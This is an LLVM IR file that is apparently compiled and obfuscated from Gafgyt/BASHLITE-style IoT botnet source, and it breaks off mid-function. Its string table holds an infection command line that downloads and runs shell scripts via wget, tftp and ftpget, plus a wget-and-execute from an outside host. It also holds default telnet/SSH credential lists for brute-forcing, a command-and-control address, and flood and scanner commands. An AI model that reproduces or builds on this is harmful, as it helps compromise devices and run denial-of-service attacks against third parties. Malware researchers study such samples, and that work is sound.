; ModuleID = 'host/ir_bcf/B1nary.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [375 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"0.0.0.0:666\00", align 1
@useragents = global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@passwords = global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0)], align 16
@.str.29 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.30 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.31 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"123\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"7ujMko0vizxv\00\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.127 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.39 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.40 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.42 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.44 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.46 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.48 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.51 = private unnamed_addr constant [14 x i8] c"GET gtop.sh\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.55 = private unnamed_addr constant [97 x i8] c"wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"user:\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.62 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.64 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"denied\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.75 = private unnamed_addr constant [62 x i8] c"sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [32 x i8] c"/bin/busybox;echo -e 'gayfgt'\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.82 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.83 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.91 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.96 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.97 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.98 = private unnamed_addr constant [39 x i8] c"SCANNER SSH/TELNET ON | SSH/TELNET OFF\00", align 1
@.str.99 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.100 = private unnamed_addr constant [24 x i8] c"TELNET SCANNER STOPPED\0A\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"TELNET ON\00", align 1
@.str.102 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER EXECUTED\0A\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.104 = private unnamed_addr constant [22 x i8] c"SSH SCANNER EXECUTED\0A\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.109 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.110 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.113 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"DARKAI\00", align 1
@.str.116 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.117 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.120 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.121 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.124 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* @x.1
  %36 = load i32, i32* @y.2
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* %4, align 4
  %44 = load i32, i32* %3, align 4
  %45 = sub i32 %43, %44
  %46 = load i32, i32* @rand_cmwc.i, align 4
  %47 = zext i32 %46 to i64
  %48 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %47
  store i32 %45, i32* %48, align 4
  %49 = load i32, i32* @x.1
  %50 = load i32, i32* @y.2
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %45

originalBBalteredBB:                              ; preds = %originalBB, %34
  %57 = load i32, i32* %4, align 4
  %58 = load i32, i32* %3, align 4
  %_ = sub i32 %57, %58
  %gen = mul i32 %_, %58
  %_1 = shl i32 %57, %58
  %_2 = shl i32 %57, %58
